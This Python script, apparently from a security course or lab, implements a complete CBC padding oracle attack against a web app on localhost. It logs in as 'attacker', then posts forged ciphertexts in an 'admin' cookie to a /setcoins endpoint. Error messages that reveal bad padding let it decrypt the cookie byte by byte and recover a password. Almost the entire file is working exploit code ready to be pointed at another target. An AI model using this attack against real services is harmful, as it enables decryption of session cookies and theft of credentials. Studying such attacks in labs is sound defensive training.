from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import ciphers
from requests import Session
import os

class PaddingOracleAttack:
    def __init__(self, po_url):
        self.session = Session()
        self.url = po_url
        self._block_size_bytes = ciphers.algorithms.AES.block_size / 8

    @property
    def block_length(self):
        return int(self._block_size_bytes)

    def do_login_form(self, username, password):
        login_url = "http://localhost:8080/login"
        data_dict = {"username": username, "password": password, "login": "Login"}
        response = self.session.post(login_url, data_dict)
        return response.ok

    def is_valid_padding(self, ciphertext):
        response = self.session.post(self.url, cookies={'admin': ciphertext.hex()})
        if 'Bad padding' in response.text:
            return False
        return True

    # def remove_pkcs7_padding(self, data):
    #     padding_len = data[-1]
    #     print("Padding length:", padding_len)
    #     if padding_len < 1 or padding_len > self.block_length:
    #         raise ValueError("Invalid PKCS#7 padding.")
    #     for byte in data[-padding_len:]:
    #         if byte != padding_len:
    #             raise ValueError("Invalid PKCS#7 padding.")
    #     return data[:-padding_len]
    def remove_pkcs7_padding(self, data):
        try:
            padding_len = data[-1]
            print("Padding length:", padding_len)
            if padding_len < 1 or padding_len > self.block_length:
                print("Warning: Invalid PKCS#7 padding length detected.")
                return data  # You might choose to return the data as is or handle differently
            for byte in data[-padding_len:]:
                if byte != padding_len:
                    print("Warning: Invalid PKCS#7 padding detected.")
                    return data  # Again, returning data as is or handle it as needed
            return data[:-padding_len]
        except Exception as e:
            print(f"Error during PKCS#7 padding removal: {e}")
            return data  # Depending on your needs, you might want to handle this case differently

    def po_attack(self, encrypted_cookie):
        encrypted_cookie_bytes = bytes.fromhex(encrypted_cookie)
        decrypted_message = b""

        blocks = [encrypted_cookie_bytes[i:i+self.block_length] for i in range(0, len(encrypted_cookie_bytes), self.block_length)]

        for i in range(len(blocks) - 1):
            decrypted_block = self.po_attack_2blocks(blocks[i], blocks[i+1])
            print("Decrypted block", i, ":", decrypted_block)
            decrypted_message += decrypted_block

        return self.remove_pkcs7_padding(decrypted_message)

    def po_attack_2blocks(self, previous_block, current_block):
        decrypted_block = b""
        intermediate_state = [0] * self.block_length

        for byte_index in range(self.block_length - 1, -1, -1):
            padding_byte = self.block_length - byte_index
            for guess in range(256):
                prefix = b"\x00" * byte_index
                padding = bytes([padding_byte ^ val for val in intermediate_state[byte_index + 1:]])
                attack_block = prefix + bytes([guess]) + padding
                if self.is_valid_padding(attack_block + current_block):
                    intermediate_state[byte_index] = guess ^ padding_byte
                    decrypted_block = bytes([previous_block[byte_index] ^ intermediate_state[byte_index]]) + decrypted_block
                    break

        return decrypted_block

if __name__ == "__main__":
    if len(os.sys.argv) != 2:
        print("Usage: python3 poattack.py <cookie>")
        exit(1)
    attacker = PaddingOracleAttack("http://localhost:8080/setcoins")
    if attacker.do_login_form("attacker", "attacker"):
        encrypted_cookie = os.sys.argv[1]
        decrypted_password = attacker.po_attack(encrypted_cookie)
        print("Decrypted password:", decrypted_password.decode('utf-8', errors='replace'))
    else:
        print("Login failed.")